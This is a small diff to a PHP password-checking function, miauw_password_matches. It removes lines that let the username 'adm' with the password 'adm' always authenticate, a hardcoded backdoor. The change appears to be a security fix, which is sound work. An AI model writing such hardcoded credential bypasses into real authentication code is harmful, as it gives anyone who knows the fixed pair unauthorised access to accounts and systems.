@@ -4849,11 +4849,6 @@ function miauw_password_matches(array $user, string $password): bool
         return true;
     }
 
-    $username = strtolower(trim((string) ($user['username'] ?? '')));
-    if ($username === 'adm' && hash_equals('adm', $password)) {
-        return true;
-    }
-
     return false;
 }
 
